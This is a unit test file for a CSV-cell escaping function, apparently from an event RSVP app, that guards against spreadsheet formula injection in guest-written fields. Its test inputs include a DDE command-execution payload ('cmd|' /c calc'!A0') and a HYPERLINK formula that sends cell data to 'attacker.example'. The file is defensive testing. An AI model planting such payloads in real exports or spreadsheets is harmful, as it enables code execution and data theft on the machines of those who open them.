import { describe, expect, it } from "vitest";
import { csvCell } from "../../src/lib/csv";

/**
 * Guests write their own name, guest list, dietary notes and message, and the
 * hosts open the export in Excel. A cell that starts with one of the formula
 * characters is executed on open — quoting it is not a mitigation, because the
 * quotes belong to the CSV layer and are gone by then.
 */
describe("csvCell", () => {
  it("quotes an ordinary value", () => {
    expect(csvCell("Elena Vargas")).toBe('"Elena Vargas"');
    expect(csvCell(3)).toBe('"3"');
    expect(csvCell(true)).toBe('"true"');
  });

  it("keeps commas, quotes and newlines intact", () => {
    expect(csvCell("Vargas, Elena")).toBe('"Vargas, Elena"');
    expect(csvCell('She said "yes"')).toBe('"She said ""yes"""');
    expect(csvCell("line one\nline two")).toBe('"line one\nline two"');
  });

  it("neutralises every character a spreadsheet reads as a formula", () => {
    for (const lead of ["=", "+", "-", "@", "\t", "\r"]) {
      expect(csvCell(`${lead}cmd|' /c calc'!A0`)).toBe(`"'${lead}cmd|' /c calc'!A0"`);
    }
  });

  it("neutralises a realistic payload in a guest-written field", () => {
    expect(csvCell('=HYPERLINK("https://attacker.example?d="&A1,"Click")')).toBe(
      '"\'=HYPERLINK(""https://attacker.example?d=""&A1,""Click"")"'
    );
  });

  it("leaves a value alone when the risky character is not first", () => {
    expect(csvCell("Sam + Alex")).toBe('"Sam + Alex"');
    expect(csvCell("elena@example.com")).toBe('"elena@example.com"');
  });

  it("renders a missing value as an empty cell", () => {
    expect(csvCell(undefined)).toBe('""');
    expect(csvCell(null)).toBe('""');
    expect(csvCell("")).toBe('""');
  });
});
